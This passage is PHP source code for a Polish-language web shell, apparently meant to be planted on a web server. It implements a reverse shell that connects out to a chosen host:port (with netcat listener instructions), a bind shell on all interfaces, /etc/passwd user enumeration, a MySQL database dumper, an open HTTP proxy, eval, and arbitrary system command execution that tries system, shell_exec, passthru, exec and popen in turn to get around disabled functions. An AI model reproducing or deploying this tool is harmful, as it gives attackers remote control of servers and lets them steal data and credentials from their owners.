			$aHost[1] = 3306;
		}

		/**
		 * login@pass
		 */
		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1], 2 );

		/**
		 * PDO jest wymagane
		 */
		if( ! extension_loaded( 'pdo' ) )
		{
			return 'Brak rozszerzenia PDO';
		}

		try
		{
			/**
			 * Polaczenie do bazy
			 */
			$oPdo = new PDO( sprintf( 'mysql:host=%s;port=%d;dbname=%s', $aHost[0], $aHost[1], $this -> aArgv[2] ), $sUsername, $sPassword );

			$oDumper = new MysqlDumper();
			$oDumper -> setPdo( $oPdo )
				 -> setDownload( 1 )
				 -> setExtendedInsert( 1 );

			if( $this -> iArgc > 3 )
			{
				$oDumper -> setTables( array_slice( $this -> aArgv, 3 ) );
			}
			$oDumper -> get();
			exit ;

		}
		/**
		 * Wyjatek
		 */
		catch( PDOException $oException )
		{
			return sprintf( 'Wystąpił błąd: %s', $oException -> getMessage() );
		}
		catch( MysqlDumperException $oException )
		{
			return sprintf( 'Wystąpił błąd: %s', $oException -> getMessage() );
		}
	}

	/**
	 * Komenda - backconnect
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandBackConnect()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
backconnect, bc - Połączenie zwrotne

	Klient (shell) łączy się pod wskazany adres dając dostęp do powłoki

	Użycie:
		backconnect host:port

		komenda ":exit" zamyka połączenie

		najlepiej uruchomić w nowym oknie

	Przykład:
		backconnect localhost:6666

	NetCat:
		nc -vv -l -p 6666
HELP;
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		/**
		 * Port jest wymagany
		 */
		if( $aHost[1] === 0 )
		{
			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
		}

		/**
		 * Polaczenie z hostem
		 */
		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
		{
			return sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] );
		}

		fwrite( $rSock, $sTitle = sprintf( "Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );

		/**
		 * BC
		 */
		for(;;)
		{
			if( ( $sCmd = fread( $rSock, 1024 ) ) !== FALSE )
			{
				$sCmd = rtrim( $sCmd );
				if( $sCmd === ':exit' )
				{
					fwrite( $rSock, "\r\nbye ;)" );
					fclose( $rSock );

					echo 'Zakończono backconnect';
					exit ;
				}

				fwrite( $rSock, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
				fwrite( $rSock, "\r\nroot#" );
			}
		}
	}

	/**
	 * Komenda - bind
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandBind()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
bind - Dostęp do powłoki na danym porcie

	Użycie:
		bind port

		komenda ":exit" zamyka połączenie

		najlepiej uruchomić w nowym oknie

	Przykład:
		bind 6666

	NetCat:
		nc host 6666
HELP;
		}

		/**
		 * Rozszerzenie "sockets" jes wymagane
		 */
		if( ! function_exists( 'socket_create' ) )
		{
			return 'Brak rozszerzenia "sockets"';
		}

		/**
		 * Sprawdzanie poprawnosci portu
		 */
		if( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65535 ) )
		{
			return sprintf( 'Błędny port "%d"', $this -> aArgv[0] );
		}

		/**
		 * Tworzenie socketa
		 */
		if( ! ( $rSock = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp ' ) ) ) )
		{
			return 'Nie można utworzyć połączenia';
		}

		/**
		 * Bindowanie
		 */
		if( ! ( socket_bind( $rSock, '0.0.0.0', $this -> aArgv[0] ) ) )
		{
			return sprintf( 'Nie można zbindować "0.0.0.0:%d"', $this -> aArgv[0] );
		}

		if( ! ( socket_listen( $rSock ) ) )
		{
			return sprintf( 'Nie można nasłuchiwać "0.0.0.0:%d"', $this -> aArgv[0] );
		}

		$bConnected = FALSE;

		/**
		 * bind
		 */
		for(;;)
		{
			/**
			 * Klient
			 */
			if( ! ( $rClient = socket_accept( $rSock ) ) )
			{
				usleep( 10000 );
			}
			else
			{
				/**
				 * Naglowek
				 */
				if( ! $bConnected )
				{
					socket_write( $rClient, sprintf( "Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
					$bConnected = TRUE;
				}

				/**
				 * Komenda
				 */
				for(;;)
				{
					if( ( $sCmd = rtrim( socket_read( $rClient, 1024, PHP_NORMAL_READ ) ) ) )
					{
						if( $sCmd === ':exit' )
						{
							socket_write( $rClient, "\r\nDobranoc ;)" );
							socket_close( $rSock );
							socket_close( $rClient );

							echo 'Zakończono bindowanie';
							exit ;
						}

						socket_write( $rClient, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
						socket_write( $rClient, "\r\nroot#" );
					}
				}
			}
		}
	}

	/**
	 * Komenda - etcpasswd
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandEtcPasswd()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
etcpasswd - Próba pobrania struktury pliku /etc/passwd za pomocą funkcji posix_getpwuid

	Użycie:
		etcpasswd

		etcpasswd [limit_dolny] [limit_górny]

	Przykład:

		etcpasswd
		etcpasswd 1000 2000
HELP;
		}

		/**
		 * Nie mozemy uruchomic tego na windowsie
		 */
		if( $this -> bWindows )
		{
			return 'Nie można uruchomić tego na windowsie';
		}

		/**
		 * funkcja posix_getpwuid musi istniec
		 */
		if( $this -> bFuncOwnerById )
		{
			return 'Funkcja "posix_getpwuid" nie istnieje';
		}

		/**
		 * Dolny zakres
		 */
		if( isset( $this -> aArgv[0] ) && ( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65534 ) ) )
		{
			return 'Błędny zakres dolny';
		}

		/**
		 * Gorny zakres
		 */
		if( isset( $this -> aArgv[1] ) && ( ( $this -> aArgv[0] > $this -> aArgv[1] ) || ( $this -> aArgv[1] > 65534 ) ) )
		{
			return 'Błędny zakres górny';
		}

		$sOutput = NULL;

		$iMin = ( isset( $this -> aArgv[0] ) ? $this -> aArgv[0] : 0 );
		$iMax = ( isset( $this -> aArgv[1] ) ? $this -> aArgv[1] : 65535 );

		/**
		 * Iteracja
		 */
		for( $i = $iMin; $i <= $iMax; $i++ )
		{
			if( ( $aUser = posix_getpwuid( $i ) ) !== FALSE)
			{
				/**
				 * Wzor jak dla pliku /etc/passwd
				 */
				$sOutput .= sprintf( "%s:%s:%d:%d:%s:%s:%s\n", $aUser['name'], $aUser['passwd'], $aUser['uid'], $aUser['gid'], $aUser['gecos'], $aUser['dir'], $aUser['shell'] );
			}
		}

		return $sOutput;
	}

	/**
	 * Komenda - proxy
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandProxy()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
proxy - Proxy HTTP

	Proxy nie ma wielowątkowości, i ma poblemy z flushowaniem !!!
	Należy zmienić ilość polaczeń do serwera
		Opera:
			Narzedzia -> Preferencje -> Siec
			Maksymalna liczba polaczen z serweram: 2
			Maksymalna laczna liczba polaczen:     8

	Jeśli jedna osoba pobiera duży plik to następne żądania są zablokowane.
	Blokada jest zwolniona po tym jak użytkownik przerwie lub ściągnie plik
	Proxy te nie sluży do przeglądania youtuba, a wyłacznie do pobieranie małych plików tekstowych

	Aby zatrzymać serwer nalezy wyslac do niego polecenie ":exit"

	Użycie:
		proxy [opcja] port

	Opcje:
		-i - ignorowanie obrazków, jeśli wystąpi żądanie na plik .jpg .gif .png .ico .psd .bmp
		     zostanie wysłany plik graficzny gif 1x1 px

	Przykład:
		proxy 2222
		proxy -i 2222
HELP;
		}

		/**
		 * Rozszerzenie "sockets" jes wymagane
		 */
		if( ! function_exists( 'socket_create' ) )
		{
			return 'Brak rozszerzenia "sockets"';
		}

		/**
		 * Sprawdzanie poprawnosci portu
		 */
		if( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65535 ) )
		{
			return sprintf( 'Błędny port "%d"', $this -> aArgv[0] );
		}

		/**
		 * Ignorowanie obrazkow: .jpg .gif .png .ico .psd .bmp
		 */
		$bIgnoreImages = in_array( 'i', $this -> aOptv );

		/**
		 * Tworzenie socketa
		 */
		if( ! ( $rSock = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp' ) ) ) )
		{
			return "Nie można utworzyć socketa";
		}

		/**
		 * Podpinanie
		 */
		if( ! socket_bind( $rSock, '0.0.0.0', $this -> aArgv[0] ) )
		{
			return sprintf( "Nie można zbindować 0.0.0.0:%d", $this -> aArgv[0] );
		}

		/**
		 * Wylaczenie blokowania
		 */
		//socket_set_nonblock( $rSock );

		/**
		 * Nasluchiwanie
		 */
		if( ! socket_listen( $rSock ) )
		{
			return "Nie można nasłuchiwać\n";
		}

		ob_start();

		header( 'Content-Type: text/plain', TRUE );

		echo "Proxy zostało uruchomione\n\n";

		for(;;)
		{
			/**
			 * Klient
			 */
			if( ! ( $rClient = @ socket_accept( $rSock ) ) )
			{
				/**
				 * Zeby obciazenie procesora nie bylo 100%
				 */
				usleep( 10000 );
				continue ;
			}

			/*
			 * Naglowki uzytkownika
			 */
			$sHeaders = NULL;
			do
			{
				$sTmp = socket_read( $rClient,1024 );
				$iLen = strlen( $sTmp );
				$sHeaders .= $sTmp;
			}
			while( $iLen === 1024 );

			if( substr( $sTmp, 0, 1 ) === ':' )
			{
				$sCommand = rtrim( substr( $sTmp, 1 ) );

				switch( $sCommand )
				{
					case 'exit':
						echo "Command -> exit\n";
						socket_write( $rClient, "Dobranoc ;)" );

						socket_close( $rClient );

						/*
						 * Rozlaczenie klienta
						 */
						socket_close( $rSock );
						exit ;
					case 'ping':
						echo "Command -> ping\n";
						socket_close( $rClient );
						break ;
				}
				continue ;
			}

			/**
			 * Wyciaganie hosta do ktorego chcemy sie polaczyc
			 */
			if( ! preg_match( '~Host: ([^\r\n]+)~m', $sHeaders, $aHost ) )
			{
				socket_close( $rClient );
				continue ;
			}

			/**
			 * zakonczenie proxy, wysterczy w adresie wpisac http://command.exit/
			 */
			if( $aHost[1] === 'command.exit' )
			{
				echo "Command -> exit\n";
				socket_write( $rClient, "HTTP/1.1 200 OK\r\n\r\nProxy zakonczylo swoje dzialanie" );
				socket_close( $rClient );
				socket_close( $rSock );
				exit ;
			}

			/**
			 * Wyciaganie adresu do ktorego sie laczymy
			 */
			if( ! preg_match( '~(GET|POST) (.+) HTTP/1\.(1|0)+~m', $sHeaders, $aGet ) )
			{
				socket_close( $rClient );
				continue ;
			}

			/**
			 * Fix dla niektorych serwerow
			 */
			$sHeaders = preg_replace(
				sprintf( '~%s %s HTTP/1.%s~m' , $aGet[1], $aGet[2], $aGet[3] ),
				sprintf( '%s %s HTTP/1.%s' , $aGet[1], substr( $aGet[2], strlen( 'http://' . $aHost[1] ) ), $aGet[3] ),
				$sHeaders
			);

			/**
			 * Proxy-Connection ... -> Connection
			 */
			$sHeaders = preg_replace( '~^Proxy-~m', NULL, $sHeaders );

			/**
			 * Keep-Alive blokuje caly skrypt, dlatego trzeba zamienic je na polaczenie zamkniete
			 */
			$sHeaders = preg_replace( '~^Connection: Keep-Alive~m', 'Connection: Close', $sHeaders );

			/**
			 * Pobieranie adresu IP poprzez host
			 */
			$sIp = getHostByName( $aHost[1] );

			/**
			 * Statystyki
			 */
			printf( "%-80.80s ", $aGet[2] );

			/**
			 * Ignorowanie obrazkow
			 */
			if( $bIgnoreImages && in_array( pathinfo( $aGet[1], PATHINFO_EXTENSION ), array( 'jpg', 'gif', 'png', 'ico', 'psd', 'bmp' ) ) )
			{
				echo "Ignore Image\n";
				$sImageHeader = "HTTP/1.0 200 OK\r\n" .
						"Content-Type: image/gif\r\n" .
						"Accept-Ranges: bytes\r\n" .
						"Expires: Thu, 19 May 2022 12:34:56 GTM\r\n" .
						"Content-Length: 43\r\n" .
						"Connection: close\r\n" .
						"Date: Thu, 19 May 2010 08:06:09 GMT\r\n\r\n" .
						base64_decode( 'R0lGODlhAQABAIAAAP///wAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw' );
				socket_write( $rClient, $sImageHeader );

				/**
				 * Rozlaczenie klienta
				 */
				socket_close( $rClient );
				continue ;
			}

			/**
			 * Polaczenie ze zdalnym hostem (do ktorego wysylamy naglowek)
			 */
			if( ( $rHost = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp' ) ) ) )
			{

				/**
				 * Polaczenie do zdalnego hosta
				 */
				if( ! socket_connect( $rHost, $sIp, 80 ) )
				{
					echo "Error\n";
					continue ;
				}

				/**
				 * Wysylanie naglowkow
				 */
				if( ! socket_write( $rHost, $sHeaders ) )
				{
					echo "Error\n";
					continue ;
				}

				/**
				 * Czas rozpoczecia
				 */
				$fSpeed = microtime( 1 );

				/**
				 * Calkowita rozmiar pobranych danych
				 */
				$iTotalLen = 0;
				do
				{
					$sTmp = socket_read( $rHost, 1024 );
					$iLen = strlen( $sTmp );

					/**
					 * Jezeli pobieramy plik i nagle nacisniemy "Anuluj", zapobiega to
					 * blokowaniu skryptu
					 */
					if( ! socket_write( $rClient, $sTmp )  )
					{
						break ;
					}
					$iTotalLen += $iLen;
				}
				while( $iLen !== 0 );

				/**
				 * Statystyki
				 */
				printf( "Data: %7dKB Speed: %7.2fKB/s\n", ceil( $iTotalLen / 1024 ), ( $iTotalLen / ( microtime( 1 ) - $fSpeed ) / 1024 ) );
			}

			/**
			 * Rozlaczenie z hostem
			 */
			socket_close( $rHost );

			/**
			 * Rozlaczenie klienta
			 */
			socket_close( $rClient );

			ob_flush();
			flush();
		}

		/**
		 * Zamykanie socketa (chyba a raczej na pewno sie nigdy nie zamknie)
		 */
		socket_close( $rSock );
		ob_end_flush();
		exit ;
	}

	/**
	 * Komenda - chmod
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandCr3d1ts()
	{
		return <<<HELP
Jak to się mówi: <strong>&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;</strong>

Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.

Jakies sugestie, pytania ? Piszcie śmiało: <strong>Krzychu</strong> - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>

btw, sprawdziłeś komendę: '<strong>:g4m3</strong>'?

Changelog:

2011-05-31 v0.2
----------
* Wsparcie dla CLI
* Shella rozszerzono o następujące komendy:
	<strong>ping</strong>
	<strong>mkdir</strong>
	<strong>cp</strong>
	<strong>mv</strong>
	<strong>chmod</strong>
	<strong>mysql</strong>
	<strong>mysqldump</strong>
	<strong>backconnect</strong>
	<strong>bind</strong>
	<strong>proxy</strong>
	<strong>cr3d1ts</strong>
* polecenie <strong>g4m3</strong> oraz <strong>cr3d1ts</strong> nie wyświetlają się w help'ie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
* <strong>php</strong> jest aliasem dla <strong>eval</strong>

2011-05-15 v0.1
---------------
* Pierwsza wersja skryptu, zawiera podstawowe komendy takie jak:
	<strong>echo</strong>
	<strong>ls</strong>
	<strong>cat</strong>
	<strong>eval</strong>
	<strong>remove</strong>
	<strong>bcat</strong>
	<strong>socketdownload</strong>
	<strong>ftpdownload</strong>
	<strong>download</strong>
	<strong>socketupload</strong>
	<strong>ftpupload</strong>
	<strong>etcpasswd</strong>
	<strong>game</strong>
	<strong>help</strong>
HELP;
	}

	/**
	 * Komenda - game
	 *
	 * @ignore
	 * @access private
	 * @return string
	 */
	private function getCommandG4m3()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
g4m3 - Gra z komputerem, wspaniała na samotne wieczory ;)

	Sprawdziłeś już komende <strong>:cr3d1ts</strong> ?

	Użycie:
		g4m3 cyfra_z_przedziału_0-9

		g4m3 cyfra_z_przedziału_0-9 [ilość_losowań]
HELP;
		}

		/**
		 * Jesli 'liczba' jest rowna 'x' to komputer sam losuje liczby
		 */
		if( ( $this -> aArgv[0] !== 'x' ) && ( ! ctype_digit( $this -> aArgv[0] ) || strlen( $this -> aArgv[0] ) !== 1 ) )
		{
			return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
		}

		/**
		 * Maksymalnie 1000 losowan
		 */
		if( isset( $this -> aArgv[1] ) && ( ! ctype_digit( $this -> aArgv[1] ) || ( $this -> aArgv[1] > 1000 ) ) )
		{
			return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
		}

		$iLoop = ( isset( $this -> aArgv[1] ) ? (int) $this -> aArgv[1] : 10 );

		$sOutput = NULL;

		$iWins  = 0;
		$iLoses = 0;

		$iDigit = (int) $this -> aArgv[0];

		$i = 0;
		do
		{
			if( $this -> aArgv[0] === 'x' )
			{
				$iDigit = mt_rand( 0, 9 );
			}

			if( ( $iNum = mt_rand( 0, 9 ) ) === $iDigit )
			{
				$sOutput .= sprintf( "<span class=\"green\">Wygrałeś</span>   Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\n", $iDigit, $iNum );
				++$iWins;
			}
			else
			{
				$sOutput .= sprintf( "<span class=\"red\">Przegrałeś</span> Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\n", $iDigit, $iNum );
				++$iLoses;
			}
		}
		while( ++$i < $iLoop );

		return sprintf( "<span class=\"red\">Przegrałeś</span>: <strong>%d</strong>, <span class=\"green\">Wygrałeś</span>: <strong>%d</strong>, Success rata: <strong>%.2f</strong> %%\n\n%s", $iLoses, $iWins, ( $iWins / $this -> aArgv[1] ) * 100, $sOutput );
	}

	/**
	 * Komenda - help
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandHelp()
	{
		$this -> aArgv[0] = 'help';
		$this -> iArgc    = 1;

		$oClass = new ReflectionClass( 'Shell' );
		$aMethods = $oClass -> getMethods();

		/**
		 * Naglowek komendy
		 */
		$aCommandsInfo = array();

		$sOutput = NULL;

		/**
		 * Wyszukiwanie metod zaczynających się od getCommand
		 */
		foreach( $aMethods as $oClass )
		{
			$sClass = $oClass -> getName();
			if( ( strncmp( $sClass, 'getCommand', 10 ) === 0 ) && ( $sClass !== 'getCommandHelp' ) && ( $sClass !== 'getCommandCr3d1ts' ) && ( $sClass !== 'getCommandG4m3' ) )
			{
				$sInfo = $this -> {$sClass}() . "\n\n\n\n";
				$aCommandsInfo[] = substr( $sInfo, 0, strpos( $sInfo, "\n" ) );
				$sOutput .= $sInfo;

			}
		}

		$iDashPos = 0;

		/**
		 * Pozycja znaku '-'
		 */
		$aCommandsPos = array();

		/**
		 * Wyrownanie znaku '-' tak by znajdowaly sie pod soba
		 */
		foreach( $aCommandsInfo as $sCommand )
		{
			if( $iDashPos < ( $iDashNewPos = strpos( $sCommand, '-' ) ) )
			{
				$iDashPos = $iDashNewPos;
			}
			$aCommandsPos[] = strlen( trim( substr( $sCommand, 0, $iDashNewPos - 1 ) ) );
		}
		--$iDashPos;

		foreach( $aCommandsInfo as $iKey => & $sCommand )
		{
			$sCommand = substr_replace( $sCommand, str_repeat( ' ', $iDashPos - $aCommandsPos[ $iKey ] ), $aCommandsPos[ $iKey ], 0 );
		}

		return substr( implode( "\n", $aCommandsInfo ) . "\n\n\n\n" . $sOutput, 0, -3 );
	}

	/**
	 * Domyslna akcja, dostep do konsoli
	 *
	 * @uses   Request
	 * @uses   Form
	 *
	 * @access private
	 * @return string
	 */
	private function getActionBrowser( $sCmd = NULL )
	{
		$bRaw = ( $sCmd !== NULL );

		/**
		 * Zawartosc konsoli
		 */
		$sConsole = NULL;

		/**
		 * Domyslna komenda to :ls -l sciezka_do_katalogu
		 */
		if( $sCmd === NULL )
		{
			if( PHP_SAPI === 'cli' )
			{
				/**
				 * Zmienne globalne to zlo ;), to powinno zostac przekazane
				 * jako parametr w konstruktorze ... ale coz ...
				 */
				$aArgv = $GLOBALS['argv'];
				array_shift( $aArgv );

				$sCmd = implode( $aArgv, ' ' );
			}
			else if( ! Request::isPost() )
			{
				$sCmd = ':ls -l ' . dirname( __FILE__ );
			}
			else
			{
				$sCmd = (string) Request::getPost( 'cmd' );
			}
		}

		/**
		 * Komendy shella rozpoczynaja sie od znaku ':'
		 */
		if( substr( $sCmd, 0, 1 ) === ':' )
		{
			if( ( $iPos = strpos( $sCmd, ' ' ) - 1 ) !== -1 )
			{
				$this -> sCmd = substr( $sCmd, 1, $iPos );
			}
			else
			{
				$this -> sCmd = substr( $sCmd, 1 );
			}

			$this -> sArgv = ltrim( preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd ) );

			/**
			 * Rozdzielanie argumentow
			 *
			 * "sciezka do \"pliku\"" -> sciezka do "pliku"
			 */
			if( preg_match_all( '~\'(?:(?:\\\')|.*)\'|"(?:(?:\\")|(.*))"|[^ \r\n\t\'"]+~', $this -> sArgv, $aMatch ) );
			{
				/**
				 * Usuwanie koncowych znakow " oraz ', zamienianie \" na " i \' na '
				 */
				array_walk( $aMatch[0], array( $this, 'parseArgv' ) );

				$this -> aArgv = $aMatch[0];

				if( isset( $this -> aArgv[0] ) && substr( $this -> aArgv[0], 0, 1 ) === '-' )
				{
					$this -> aOptv = str_split( substr( $this -> aArgv[0], 1 ) );
					array_shift( $this -> aArgv );
					$this -> sArgv = ltrim( implode( ' ', $this -> aArgv ) );
				}
			}

			$this -> iArgc = count( $this -> aArgv );

			/**
			 *  Lista komend i aliasy
			 */
			switch( $this -> sCmd )
			{
				case 'echo':
					$sConsole = $this -> getCommandEcho();
					break ;
				case 'ping':
					$sConsole = $this -> getCommandPing();
					break ;
				case 'ls':
					$sConsole = $this -> getCommandLs();
					break ;
				case 'cat':
					$sConsole = $this -> getCommandCat();
					break ;
				case 'mkdir':
					$sConsole = $this -> getCommandMkdir();
					break ;
				case 'cp':
					$sConsole = $this -> getCommandCp();
					break ;
				case 'mv':
					$sConsole = $this -> getCommandMv();
					break ;
				case 'remove':
				case 'rm':
				case 'delete':
				case 'del':
					$sConsole = $this -> getCommandRemove();
					break ;
				case 'chmod':
					$sConsole = $this -> getCommandChmod();
					break ;
				case 'bcat':
				case 'b64':
					$sConsole = $this -> getCommandBCat();
					break ;
				case 'eval':
				case 'php':
					$sConsole = $this -> getCommandEval();
					break ;
				/**
				 * @see Line 170
				 */
				case $this -> sPhpInfo:
					$sConsole = $this -> getCommandPhpInfo();
				case 'socketdownload':
				case 'socketdown':
				case 'socketget':
					$sConsole = $this -> getCommandSocketDownload();
					break ;
				case 'ftpdownload':
				case 'ftpdown':
				case 'ftpget':
					$sConsole = $this -> getCommandFtpDownload();
					break ;
				case 'download':
				case 'down':
				case 'get':
					$sConsole = $this -> getCommandDownload();
					break ;
				case 'socketupload':
				case 'socketup':
				case 'socketput':
					$sConsole = $this -> getCommandSocketUpload();
					break ;
				case 'ftpupload':
				case 'ftpup':
				case 'ftpput':
					$sConsole = $this -> getCommandFtpUpload();
					break ;
				case 'mysql':
					$sConsole = $this -> getCommandMysql();
					break ;
				case 'mysqldump':
				case 'mysqldumper':
				case 'mysqlbackup':
				case 'dumpdb':
					$sConsole = $this -> getCommandMysqlDump();
					break ;
				case 'backconnect':
				case 'bc':
					$sConsole = $this -> getCommandBackConnect();
					break ;
				case 'bind':
					$sConsole = $this -> getCommandBind();
					break ;
				case 'etcpasswd':
					$sConsole = $this -> getCommandEtcPasswd();
					break ;
				case 'proxy':
					$sConsole = $this -> getCommandProxy();
					break ;
				case 'cr3d1ts':
					$sConsole = $this -> getCommandCr3d1ts();
					break ;
				case 'g4m3':
					$sConsole = $this -> getCommandG4m3();
					break ;
				case 'help':
					$sConsole = $this -> getCommandHelp();
					break ;
				default :
					$sConsole = sprintf( 'Nie ma takiej komendy "%s"', $this -> sCmd );
			}
		}
		elseif( $sCmd === '' )
		{
			$sConsole = 'Wpisz <strong>:help</strong> by zobaczyć pomoc';
		}
		/**
		 * Wykonanie komendy systemowej
		 */
		else if( ! $this -> bSafeMode )
		{
			ob_start();
			if( ! in_array( 'system', $this -> aDisableFunctions ) )
			{
				system( $sCmd );
			}
			else if( ! in_array( 'shell_exec', $this -> aDisableFunctions ) )
			{
				echo shell_exec( $sCmd );
			}
			else if( ! in_array( 'passthru', $this -> aDisableFunctions ) )
			{
				passthru( $sCmd );
			}
			else if( ! in_array( 'exec', $this -> aDisableFunctions ) )
			{
				exec( $sCmd );
			}
			else if( ! in_array( 'popen', $this -> aDisableFunctions ) )
			{
				$rFp = popen( $sCmd, 'r' );
				while( ! feof( $rFp ) )
				{
					echo fread( $rFp, 1024 );
				}
			}
			else
			{
				echo 'Nic sobie nie porobisz, wszystkie funkcje systemowe są poblokowane !!!';
			}

			$sData = ob_get_contents();
			ob_clean();
			ob_end_flush();
			$sConsole = htmlspecialchars( $sData );
		}
		else
		{
			$sConsole = 'Safe mode jest włączone, więc <strong>exec</strong>, <strong>shell_exec</strong>, <strong>passthru</strong>, <strong>system</strong> i <strong>fopen</strong> nie zadziałają';
		}

		if( $bRaw || ( PHP_SAPI === 'cli' ) )
		{
			return strip_tags( $sConsole );
		}

		$sContent  = sprintf( '<pre id="console">%s</pre>', $sConsole );
		$sContent .= '<div>';
		$sContent .= Form::open();
		$sContent .= Form::inputText( 'cmd', $sCmd, TRUE, array( 'size' => 110, 'id' => 'cmd' ) );
		$sContent .= Form::inputSubmit( 'submit', 'Execute', array( 'id' => 'cmd-send' ) );
		$sContent .= Form::close();
		$sContent .= '</div>';

		return $this -> getContent( $sContent );
	}

	/**
	 * Pobieranie calosci strony
	 *
	 * @uses   Request
	 *
	 * @access private
	 * @return string
	 */
	private function getContent( $sData )
	{
		$sMenu = $this -> getMenu();
		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
		$sVersion = self::VERSION;
return <<<CONTENT
<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset="utf-8"><style>
body{background-color:#eef7fb;color:#000;font-size:12px;font-family:sans-serif, Verdana, Tahoma, Arial;margin:10px;padding:0;}
a{color:#226c90;text-decoration:none;}
a:hover{color:#5a9cbb;text-decoration:underline;}
h1,h2,h3,h4,h5,h6{margin-top:10px;padding-bottom:5px;color:#054463;border-bottom:1px solid #d0d0d0;}
table{background-color:#fff;border:1px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;margin:auto;padding:6px;}
td{background-color:#f8f8f8;border-radius:5px;-moz-border-radius:5px;margin:0;padding:0 0 0 4px;}
th{color:#054463;font-size:14px;font-weight:700;background-color:#f2f2f2;border-radius:5px;-moz-border-radius:5px;margin:0;padding:2px;}
hr{margin-top:20px;background-color:#eef7fb;border:1px solid #eef7fb;}
div#body{text-align:center;border:3px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;min-width:940px;background-color:#fff;margin:0 auto;padding:8px 20px 10px;}
div#menu{text-align:left;margin:0 auto;}
div#bottom{margin:10px auto;}
div#content{padding-top:10px;margin:0 auto;}
pre#console{text-align:left;height:350px;min-height:350px;width:98%;font-size:11px;background-color:#f9f9f9;color:#000;border:3px solid #e2ecf2;overflow:scroll;margin:0 auto;padding:2px;}
input{border-radius:10px;-moz-border-radius:10px;border:1px solid #aaa;background-color:#fff;font-size:14px;padding:6px;}
input#cmd{width:89%;margin-top:10px;padding-left:10px;}
input#cmd:hover{background-color:#f1f1f1;}
input#cmd-send{margin-top:10px;margin-left:20px;}
.green{color:#55b855;font-weight:700;}
.red{color:#fb5555;font-weight:700;}</style>
</head>
<body>
</body>
<div id="body">
	<div id="menu">
		{$sMenu}
	</div>
	<div id="content">
		{$sData}
	</div>
	<div id="bottom">Strona wygenerowana w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>
</div>
</html>
CONTENT;
	}

	/**
	 * Wyswietlanie strony
	 *
	 * @access private
	 * @return string
	 */
	public function get()
	{
		$sData = $this -> getActionBrowser();

		return $sData;

	}

	/**
	 * Oczyszczanie argumentow ze zbednych znakow
	 *
	 * @access private
	 * @param  string & $sVar Argument
	 * @return void
	 */
	private function parseArgv( & $sVar )
	{
		$sVar = strtr( $sVar, array
			(
				'\\\'' => '\'',
				'\\"'  => '"'
			)
		);

		if(    ( ( substr( $sVar, 0, 1 ) === '"' ) && ( substr( $sVar, -1 ) === '"' ) )
		    || ( ( substr( $sVar, 0, 1 ) === '\'' ) && ( substr( $sVar, -1 ) === '\'' ) )
		)
		{
			$sVar = substr( $sVar, 1, -1 );
		}
	}

}

/**
 * Wylaczanie wszystkich bufferow
 */
for( $i = 0; $i < ob_get_level(); $i++ )
{
	ob_end_clean();
}

$oShell = new Shell();
echo $oShell -> get();

exit ;